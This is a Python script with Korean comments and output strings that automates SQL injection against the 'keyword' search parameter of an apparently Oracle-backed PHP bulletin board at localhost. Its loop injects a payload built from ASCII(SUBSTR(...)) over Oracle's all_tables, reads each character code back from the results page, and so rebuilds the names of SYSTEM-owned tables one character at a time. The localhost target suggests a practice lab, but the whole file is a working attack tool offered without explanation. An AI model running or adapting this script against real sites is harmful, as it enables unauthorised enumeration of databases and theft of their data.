import requests
from bs4 import BeautifulSoup

def extract_table_names(url, search_type, parameter):
    table_names = []
    j = 1

    while True:
        table_name = ""
        i = 1

        while True:
            payload = f"' and idx=ASCII(SUBSTR((SELECT table_name from (select rownum as r,table_name from all_tables where owner='SYSTEM')a where a.r={j}),{i},1)) --"
            data = {parameter: payload, 'search_type': search_type}

            try:
                response = requests.post(url, data=data, timeout=10)
                soup = BeautifulSoup(response.text, 'html.parser')
                target_element = soup.find('th', {'scope': 'row', 'class': 'text-center'})

                if not target_element:
                    break

                ascii_code = int(target_element.text.strip())
                table_name += chr(ascii_code)
                i += 1

            except (requests.RequestException, ValueError) as e:
                print(f"오류 발생: {e}")
                break

        if table_name:
            table_names.append(table_name)
            print(f"추출된 테이블 이름: {table_name}")
            j += 1
        else:
            break

    return table_names

# 메인 실행 부분
url = "http://localhost/board/oracle/index.php"
search_type = "all"
parameter = "keyword"

extracted_table_names = extract_table_names(url, search_type, parameter)
print(f"최종 추출된 테이블 이름들: {extracted_table_names}")
